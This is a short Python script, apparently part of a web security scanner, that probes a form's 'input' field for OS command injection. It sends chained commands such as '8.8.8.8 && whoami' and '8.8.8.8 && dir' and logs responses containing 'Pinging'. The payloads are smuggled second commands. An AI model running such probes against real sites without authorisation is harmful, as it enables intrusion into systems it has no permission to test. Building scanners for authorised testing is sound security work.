import requests

def test_command_injection(url, command):
    payload = {'input': command, 'submit': 'Submit'}
    response = requests.post(url, data=payload)
    return response.text

def main(folder_name,url):
#     payload list artırılabilr. whoami hem linux hemde windowsda ok
#    'http://ffu.com/command_injection.php'  
    file = open(folder_name+'/command_injection_found.txt', 'a')
    commands_to_test = ['8.8.8.8 && dir', '8.8.8.8 && whoami', '8.8.8.8 + ls']
    
    for command_to_test in commands_to_test:  
        print(f"Testing command injection with: {command_to_test}\n")
        response=test_command_injection(url, command_to_test)

        if response.find("Pinging")>0:
            print("command injection found")
            #print(response)
            file.write(f"command injection found with: {command_to_test}\n")
            file.write(f"Response: {response}\n")
    file.close()
